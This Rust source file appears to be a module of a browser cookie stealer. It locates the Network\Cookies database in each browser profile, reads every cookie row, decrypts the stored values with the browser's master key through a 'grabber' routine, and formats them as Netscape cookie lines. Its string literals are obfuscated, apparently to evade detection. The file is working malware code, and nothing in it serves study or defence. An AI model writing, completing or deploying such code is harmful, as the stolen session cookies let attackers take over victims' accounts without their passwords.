use crate::browser::utils::{Profiles, Browser, is_opera};
use rusqlite::{params, Connection};
use obfstr::obfstr as obf;

pub fn get(browser: &Browser, profile: &str) -> Vec<String> {
    let cookies_path = is_opera(&browser.name, &browser.path, profile.to_string(), obf!("\\Network\\Cookies").to_string());

    if let Err(_) = std::fs::metadata(&cookies_path) {
        return Vec::new();
    }
    
    let mut cookies: Vec<String> = Vec::new();
    let conn = Connection::open(&cookies_path).unwrap();
    let mut stmt = conn
        .prepare(obf!("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies"))
        .unwrap();
    let mut rows = stmt.query([]).unwrap();

    while let Ok(row_result) = rows.next() {
        if let Some(row) = row_result {
            let host_key: String = row.get(0).unwrap();
            let name: String = row.get(1).unwrap();
            let path: String = row.get(2).unwrap();
            let encrypted_value: Vec<u8> = row.get(3).unwrap();
            let expires_utc: i64 = row.get(4).unwrap();

            if let Ok(value) = crate::grabber::grabber::decrypt_tokens(&encrypted_value, &browser.masterkey) {
                if !(host_key.is_empty() || name.is_empty() || value.is_empty()) {
                    cookies.push(format!(
                        "{}\t{}\t{}\t{}\t{}\t{}\t{}",
                        host_key,
                        if expires_utc == 0 { obf!("FALSE").to_string() } else { obf!("TRUE").to_string() },
                        path,
                        if host_key.starts_with('.') { obf!("FALSE").to_string()  } else { obf!("TRUE").to_string() },
                        expires_utc,
                        name,
                        value
                    ));
                }
            }
        } else {
            break;
        }
    }
    cookies
}